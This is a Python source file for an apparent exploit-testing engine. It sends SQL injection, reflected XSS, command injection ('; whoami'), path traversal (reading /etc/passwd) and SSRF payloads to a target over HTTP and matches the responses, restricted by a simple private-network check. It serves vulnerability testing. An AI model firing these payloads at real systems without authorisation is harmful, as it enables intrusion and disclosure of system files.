#!/usr/bin/env python3
"""
Exploit Manager Engine
Kombinerar funktionalitet från rengine, PayloadsAllTheThings och adversarial-robustness-toolbox
för säker hantering och testning av exploits
"""

import asyncio
import logging
import json
import os
import subprocess
import tempfile
import shutil
from typing import Dict, Any, Optional, List, Tuple, Set, Union
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime, timedelta
from pathlib import Path
import hashlib
import base64
import re
import requests
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)

class ExploitType(Enum):
    """Types of exploits"""
    WEB_APPLICATION = "web_application"
    NETWORK_SERVICE = "network_service" 
    PRIVILEGE_ESCALATION = "privilege_escalation"
    REMOTE_CODE_EXECUTION = "remote_code_execution"
    BUFFER_OVERFLOW = "buffer_overflow"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    DENIAL_OF_SERVICE = "denial_of_service"
    INFORMATION_DISCLOSURE = "information_disclosure"
    SOCIAL_ENGINEERING = "social_engineering"
    PHISHING = "phishing"
    MALWARE = "malware"

class ExploitStatus(Enum):
    """Status of exploit execution"""
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    BLOCKED = "blocked"
    ETHICAL_VIOLATION = "ethical_violation"

class TargetType(Enum):
    """Types of targets"""
    WEB_APPLICATION = "web_application"
    NETWORK_HOST = "network_host"
    SERVICE = "service"
    DATABASE = "database"
    API_ENDPOINT = "api_endpoint"
    FILE_SYSTEM = "file_system"

@dataclass
class ExploitTarget:
    """Represents a target for exploitation"""
    target_id: str
    target_type: TargetType
    host: str
    port: int = 80
    service: str = ""
    version: str = ""
    os: str = ""
    additional_info: Dict[str, Any] = field(default_factory=dict)
    
@dataclass
class ExploitModule:
    """Represents an exploit module"""
    module_id: str
    name: str
    description: str
    exploit_type: ExploitType
    severity: str = "medium"
    cve_ids: List[str] = field(default_factory=list)
    affected_systems: List[str] = field(default_factory=list)
    requirements: List[str] = field(default_factory=list)
    payload_template: str = ""
    execution_method: str = "http"  # http, tcp, udp, ssh, etc.
    ethical_constraints: List[str] = field(default_factory=list)
    created_date: datetime = field(default_factory=datetime.now)
    
@dataclass
class ExploitResult:
    """Results from exploit execution"""
    execution_id: str
    module_id: str
    target: ExploitTarget
    status: ExploitStatus
    start_time: datetime
    end_time: Optional[datetime] = None
    output: str = ""
    error_message: str = ""
    artifacts: List[str] = field(default_factory=list)
    evidence: List[str] = field(default_factory=list)
    remediation_notes: str = ""

class EthicalConstraints:
    """Ethical constraints and safety checks"""
    
    FORBIDDEN_TARGETS = [
        "government",
        "healthcare",
        "education",
        "critical_infrastructure",
        "financial_institution"
    ]
    
    FORBIDDEN_ACTIONS = [
        "data_destruction",
        "service_disruption",
        "data_exfiltration", 
        "persistent_access",
        "lateral_movement"
    ]
    
    @staticmethod
    def check_target_allowed(target: ExploitTarget) -> Tuple[bool, str]:
        """Check if target is ethically allowed"""
        # Check against forbidden target types
        target_info = str(target.additional_info).lower()
        
        for forbidden in EthicalConstraints.FORBIDDEN_TARGETS:
            if forbidden in target_info or forbidden in target.host.lower():
                return False, f"Target appears to be {forbidden} - testing forbidden"
        
        # Check for localhost/private networks only
        if not (target.host.startswith('127.') or 
                target.host.startswith('192.168.') or
                target.host.startswith('10.') or
                target.host == 'localhost'):
            return False, "Only localhost and private networks allowed for testing"
        
        return True, "Target allowed"
    
    @staticmethod
    def check_action_allowed(action: str) -> Tuple[bool, str]:
        """Check if action is ethically allowed"""
        action_lower = action.lower()
        
        for forbidden in EthicalConstraints.FORBIDDEN_ACTIONS:
            if forbidden in action_lower:
                return False, f"Action {forbidden} is forbidden"
        
        return True, "Action allowed"

class ExploitManager:
    """Advanced exploit manager with ethical constraints"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.exploit_modules = {}
        self.execution_history = []
        self.active_executions = {}
        self.safety_enabled = self.config.get('safety_enabled', True)
        
        # Load exploit modules
        self._load_exploit_modules()
        
        # Setup logging
        self.logger = logging.getLogger(__name__)
        
    def _load_exploit_modules(self):
        """Load available exploit modules"""
        
        # Web Application Exploits
        self.exploit_modules.update({
            'sql_injection_basic': ExploitModule(
                module_id='sql_injection_basic',
                name='Basic SQL Injection',
                description='Tests for basic SQL injection vulnerabilities',
                exploit_type=ExploitType.WEB_APPLICATION,
                severity='high',
                cve_ids=[],
                affected_systems=['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle'],
                requirements=['requests'],
                payload_template="' OR '1'='1' -- ",
                execution_method='http',
                ethical_constraints=['read_only', 'no_data_modification']
            ),
            
            'xss_reflected': ExploitModule(
                module_id='xss_reflected',
                name='Reflected XSS',
                description='Tests for reflected cross-site scripting vulnerabilities',
                exploit_type=ExploitType.WEB_APPLICATION,
                severity='medium',
                affected_systems=['Web Applications'],
                payload_template="<script>alert('XSS')</script>",
                execution_method='http',
                ethical_constraints=['proof_of_concept_only']
            ),
            
            'command_injection': ExploitModule(
                module_id='command_injection',
                name='Command Injection',
                description='Tests for command injection vulnerabilities',
                exploit_type=ExploitType.REMOTE_CODE_EXECUTION,
                severity='critical',
                payload_template="; whoami",
                execution_method='http',
                ethical_constraints=['safe_commands_only']
            ),
            
            'path_traversal': ExploitModule(
                module_id='path_traversal',
                name='Path Traversal',
                description='Tests for directory traversal vulnerabilities',
                exploit_type=ExploitType.INFORMATION_DISCLOSURE,
                severity='medium',
                payload_template="../../../etc/passwd",
                execution_method='http',
                ethical_constraints=['read_only']
            ),
            
            'ssrf_basic': ExploitModule(
                module_id='ssrf_basic',
                name='Server-Side Request Forgery',
                description='Tests for SSRF vulnerabilities',
                exploit_type=ExploitType.WEB_APPLICATION,
                severity='high',
                payload_template="http://127.0.0.1:80/",
                execution_method='http',
                ethical_constraints=['internal_only']
            )
        })
        
        # Network Service Exploits
        self.exploit_modules.update({
            'ssh_bruteforce': ExploitModule(
                module_id='ssh_bruteforce',
                name='SSH Brute Force',
                description='Tests weak SSH credentials',
                exploit_type=ExploitType.AUTHENTICATION_BYPASS,
                severity='medium',
                execution_method='ssh',
                ethical_constraints=['common_passwords_only', 'rate_limited']
            ),
            
            'ftp_anonymous': ExploitModule(
                module_id='ftp_anonymous',
                name='FTP Anonymous Access',
                description='Tests for anonymous FTP access',
                exploit_type=ExploitType.AUTHENTICATION_BYPASS,
                severity='low',
                execution_method='ftp',
                ethical_constraints=['read_only']
            )
        })
        
        logger.info(f"Loaded {len(self.exploit_modules)} exploit modules")
    
    async def execute_exploit(self, 
                            module_id: str, 
                            target: ExploitTarget,
                            parameters: Dict[str, Any] = None) -> ExploitResult:
        """Execute an exploit against a target"""
        
        execution_id = self._generate_execution_id(module_id, target)
        
        # Safety checks
        if self.safety_enabled:
            allowed, reason = EthicalConstraints.check_target_allowed(target)
            if not allowed:
                return ExploitResult(
                    execution_id=execution_id,
                    module_id=module_id,
                    target=target,
                    status=ExploitStatus.ETHICAL_VIOLATION,
                    start_time=datetime.now(),
                    error_message=f"Ethical constraint violation: {reason}"
                )
        
        if module_id not in self.exploit_modules:
            return ExploitResult(
                execution_id=execution_id,
                module_id=module_id,
                target=target,
                status=ExploitStatus.FAILED,
                start_time=datetime.now(),
                error_message=f"Unknown exploit module: {module_id}"
            )
        
        exploit_module = self.exploit_modules[module_id]
        
        # Additional safety checks for module
        for constraint in exploit_module.ethical_constraints:
            allowed, reason = EthicalConstraints.check_action_allowed(constraint)
            if not allowed:
                return ExploitResult(
                    execution_id=execution_id,
                    module_id=module_id,
                    target=target,
                    status=ExploitStatus.ETHICAL_VIOLATION,
                    start_time=datetime.now(),
                    error_message=f"Module constraint violation: {reason}"
                )
        
        # Execute the exploit
        result = ExploitResult(
            execution_id=execution_id,
            module_id=module_id,
            target=target,
            status=ExploitStatus.RUNNING,
            start_time=datetime.now()
        )
        
        self.active_executions[execution_id] = result
        
        try:
            # Route to appropriate execution method
            if exploit_module.execution_method == 'http':
                result = await self._execute_http_exploit(exploit_module, target, result, parameters)
            elif exploit_module.execution_method == 'ssh':
                result = await self._execute_ssh_exploit(exploit_module, target, result, parameters)
            elif exploit_module.execution_method == 'ftp':
                result = await self._execute_ftp_exploit(exploit_module, target, result, parameters)
            else:
                result.status = ExploitStatus.FAILED
                result.error_message = f"Unsupported execution method: {exploit_module.execution_method}"
        
        except Exception as e:
            result.status = ExploitStatus.FAILED
            result.error_message = str(e)
            logger.error(f"Exploit execution failed: {e}")
        
        finally:
            result.end_time = datetime.now()
            self.execution_history.append(result)
            if execution_id in self.active_executions:
                del self.active_executions[execution_id]
        
        return result
    
    async def _execute_http_exploit(self, 
                                   exploit_module: ExploitModule, 
                                   target: ExploitTarget,
                                   result: ExploitResult,
                                   parameters: Dict[str, Any] = None) -> ExploitResult:
        """Execute HTTP-based exploit"""
        
        parameters = parameters or {}
        base_url = f"http://{target.host}:{target.port}"
        
        try:
            if exploit_module.module_id == 'sql_injection_basic':
                result = await self._test_sql_injection(base_url, exploit_module, result, parameters)
            elif exploit_module.module_id == 'xss_reflected':
                result = await self._test_xss_reflected(base_url, exploit_module, result, parameters)
            elif exploit_module.module_id == 'command_injection':
                result = await self._test_command_injection(base_url, exploit_module, result, parameters)
            elif exploit_module.module_id == 'path_traversal':
                result = await self._test_path_traversal(base_url, exploit_module, result, parameters)
            elif exploit_module.module_id == 'ssrf_basic':
                result = await self._test_ssrf(base_url, exploit_module, result, parameters)
            else:
                result.status = ExploitStatus.FAILED
                result.error_message = f"HTTP exploit {exploit_module.module_id} not implemented"
                
        except Exception as e:
            result.status = ExploitStatus.FAILED
            result.error_message = f"HTTP exploit execution error: {str(e)}"
            
        return result
    
    async def _test_sql_injection(self, base_url: str, module: ExploitModule, result: ExploitResult, params: Dict[str, Any]) -> ExploitResult:
        """Test for SQL injection vulnerabilities"""
        
        payloads = [
            "' OR '1'='1' -- ",
            "' UNION SELECT null,null,null -- ",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1"
        ]
        
        test_parameters = ['id', 'user', 'search', 'query', 'name']
        
        for payload in payloads:
            for param in test_parameters:
                try:
                    test_url = f"{base_url}/?{param}={payload}"
                    
                    response = requests.get(test_url, timeout=10)
                    
                    # Look for SQL error patterns
                    sql_errors = [
                        'mysql_fetch_array',
                        'ora-\d{5}',
                        'postgresql.*error',
                        'microsoft sql',
                        'sqlite.*error'
                    ]
                    
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, response.text, re.IGNORECASE):
                            result.status = ExploitStatus.SUCCESS
                            result.output = f"SQL injection found with payload: {payload}"
                            result.evidence.append(f"Error pattern: {error_pattern}")
                            result.evidence.append(f"Response excerpt: {response.text[:200]}")
                            result.remediation_notes = "Use parameterized queries to prevent SQL injection"
                            return result
                            
                except Exception as e:
                    continue
        
        result.status = ExploitStatus.FAILED
        result.output = "No SQL injection vulnerabilities found"
        return result
    
    async def _test_xss_reflected(self, base_url: str, module: ExploitModule, result: ExploitResult, params: Dict[str, Any]) -> ExploitResult:
        """Test for reflected XSS vulnerabilities"""
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        test_parameters = ['q', 'search', 'query', 'name', 'message']
        
        for payload in payloads:
            for param in test_parameters:
                try:
                    test_url = f"{base_url}/?{param}={payload}"
                    
                    response = requests.get(test_url, timeout=10)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        result.status = ExploitStatus.SUCCESS
                        result.output = f"Reflected XSS found with payload: {payload}"
                        result.evidence.append(f"Payload reflected in response")
                        result.remediation_notes = "Implement output encoding and Content Security Policy"
                        return result
                        
                except Exception as e:
                    continue
        
        result.status = ExploitStatus.FAILED
        result.output = "No reflected XSS vulnerabilities found"
        return result
    
    async def _test_command_injection(self, base_url: str, module: ExploitModule, result: ExploitResult, params: Dict[str, Any]) -> ExploitResult:
        """Test for command injection vulnerabilities"""
        
        # Only use safe commands for ethical testing
        safe_payloads = [
            "; whoami",
            "; id", 
            "; pwd",
            "| whoami",
            "&& whoami"
        ]
        
        test_parameters = ['cmd', 'command', 'exec', 'system']
        
        for payload in safe_payloads:
            for param in test_parameters:
                try:
                    test_url = f"{base_url}/?{param}={payload}"
                    
                    response = requests.get(test_url, timeout=10)
                    
                    # Look for command output patterns
                    command_patterns = [
                        r'uid=\d+\(',
                        r'root:.*:0:0:',
                        r'[a-zA-Z]:\\.*>'  # Windows path
                    ]
                    
                    for pattern in command_patterns:
                        if re.search(pattern, response.text):
                            result.status = ExploitStatus.SUCCESS
                            result.output = f"Command injection found with payload: {payload}"
                            result.evidence.append(f"Command output detected")
                            result.remediation_notes = "Avoid system calls with user input, use safe APIs"
                            return result
                            
                except Exception as e:
                    continue
        
        result.status = ExploitStatus.FAILED
        result.output = "No command injection vulnerabilities found"
        return result
    
    async def _test_path_traversal(self, base_url: str, module: ExploitModule, result: ExploitResult, params: Dict[str, Any]) -> ExploitResult:
        """Test for path traversal vulnerabilities"""
        
        payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        test_parameters = ['file', 'filename', 'path', 'include']
        
        for payload in payloads:
            for param in test_parameters:
                try:
                    test_url = f"{base_url}/?{param}={payload}"
                    
                    response = requests.get(test_url, timeout=10)
                    
                    # Look for file content patterns
                    file_patterns = [
                        r'root:.*:0:0:',
                        r'\[boot loader\]',
                        r'# /etc/passwd'
                    ]
                    
                    for pattern in file_patterns:
                        if re.search(pattern, response.text):
                            result.status = ExploitStatus.SUCCESS
                            result.output = f"Path traversal found with payload: {payload}"
                            result.evidence.append(f"File content detected")
                            result.remediation_notes = "Validate and sanitize file paths"
                            return result
                            
                except Exception as e:
                    continue
        
        result.status = ExploitStatus.FAILED
        result.output = "No path traversal vulnerabilities found"
        return result
    
    async def _test_ssrf(self, base_url: str, module: ExploitModule, result: ExploitResult, params: Dict[str, Any]) -> ExploitResult:
        """Test for SSRF vulnerabilities"""
        
        # Only test internal addresses for ethical reasons
        payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://127.0.0.1:3306"
        ]
        
        test_parameters = ['url', 'link', 'callback', 'webhook']
        
        for payload in payloads:
            for param in test_parameters:
                try:
                    test_url = f"{base_url}/?{param}={payload}"
                    
                    response = requests.get(test_url, timeout=10)
                    
                    # Look for internal service responses
                    ssrf_patterns = [
                        r'connection refused',
                        r'internal server error',
                        r'ssh-.*openssh',
                        r'mysql.*version'
                    ]
                    
                    for pattern in ssrf_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            result.status = ExploitStatus.SUCCESS
                            result.output = f"SSRF found with payload: {payload}"
                            result.evidence.append(f"Internal service response detected")
                            result.remediation_notes = "Validate URLs, use allow lists for destinations"
                            return result
                            
                except Exception as e:
                    continue
        
        result.status = ExploitStatus.FAILED
        result.output = "No SSRF vulnerabilities found"
        return result
    
    async def _execute_ssh_exploit(self, module: ExploitModule, target: ExploitTarget, result: ExploitResult, params: Dict[str, Any]) -> ExploitResult:
        """Execute SSH-based exploit"""
        result.status = ExploitStatus.FAILED
        result.error_message = "SSH exploits not implemented in this version"
        return result
    
    async def _execute_ftp_exploit(self, module: ExploitModule, target: ExploitTarget, result: ExploitResult, params: Dict[str, Any]) -> ExploitResult:
        """Execute FTP-based exploit"""
        result.status = ExploitStatus.FAILED
        result.error_message = "FTP exploits not implemented in this version"
        return result
    
    def get_available_modules(self, exploit_type: ExploitType = None) -> List[ExploitModule]:
        """Get list of available exploit modules"""
        modules = list(self.exploit_modules.values())
        
        if exploit_type:
            modules = [m for m in modules if m.exploit_type == exploit_type]
        
        return modules
    
    def get_execution_history(self, target_host: str = None) -> List[ExploitResult]:
        """Get execution history"""
        history = self.execution_history
        
        if target_host:
            history = [r for r in history if r.target.host == target_host]
        
        return history
    
    def get_active_executions(self) -> List[ExploitResult]:
        """Get currently running executions"""
        return list(self.active_executions.values())
    
    def _generate_execution_id(self, module_id: str, target: ExploitTarget) -> str:
        """Generate unique execution ID"""
        timestamp = datetime.now().isoformat()
        data = f"{module_id}_{target.host}_{timestamp}"
        return hashlib.md5(data.encode()).hexdigest()[:12]

    def generate_report(self, target_host: str = None) -> Dict[str, Any]:
        """Generate exploitation report"""
        
        history = self.get_execution_history(target_host)
        
        report = {
            'generated_at': datetime.now().isoformat(),
            'target_host': target_host or 'all',
            'total_executions': len(history),
            'successful_exploits': len([r for r in history if r.status == ExploitStatus.SUCCESS]),
            'failed_exploits': len([r for r in history if r.status == ExploitStatus.FAILED]),
            'ethical_violations': len([r for r in history if r.status == ExploitStatus.ETHICAL_VIOLATION]),
            'exploits_by_type': {},
            'vulnerabilities_found': [],
            'remediation_summary': []
        }
        
        # Group by exploit type
        for result in history:
            module = self.exploit_modules.get(result.module_id)
            if module:
                exploit_type = module.exploit_type.value
                if exploit_type not in report['exploits_by_type']:
                    report['exploits_by_type'][exploit_type] = []
                report['exploits_by_type'][exploit_type].append({
                    'execution_id': result.execution_id,
                    'status': result.status.value,
                    'output': result.output
                })
        
        # Collect successful exploits
        for result in history:
            if result.status == ExploitStatus.SUCCESS:
                report['vulnerabilities_found'].append({
                    'target': f"{result.target.host}:{result.target.port}",
                    'module': result.module_id,
                    'evidence': result.evidence,
                    'remediation': result.remediation_notes
                })
        
        return report

# Convenience functions
async def quick_exploit_test(target_host: str, port: int = 80) -> List[ExploitResult]:
    """Quick exploit test with common modules"""
    manager = ExploitManager()
    
    target = ExploitTarget(
        target_id=f"{target_host}_{port}",
        target_type=TargetType.WEB_APPLICATION,
        host=target_host,
        port=port
    )
    
    # Test common web vulnerabilities
    common_modules = ['sql_injection_basic', 'xss_reflected', 'path_traversal']
    results = []
    
    for module_id in common_modules:
        result = await manager.execute_exploit(module_id, target)
        results.append(result)
    
    return results

if __name__ == "__main__":
    # Test the exploit manager
    async def test_exploit_manager():
        manager = ExploitManager()
        
        # Create a test target (localhost only for safety)
        target = ExploitTarget(
            target_id="test_localhost",
            target_type=TargetType.WEB_APPLICATION,
            host="127.0.0.1",
            port=80
        )
        
        # Test SQL injection module
        result = await manager.execute_exploit('sql_injection_basic', target)
        
        print(f"Exploit execution: {result.execution_id}")
        print(f"Status: {result.status.value}")
        print(f"Output: {result.output}")
        
        # Generate report
        report = manager.generate_report()
        print(f"\nExecution report:")
        print(f"Total executions: {report['total_executions']}")
        print(f"Successful: {report['successful_exploits']}")
        print(f"Failed: {report['failed_exploits']}")
    
    asyncio.run(test_exploit_manager())
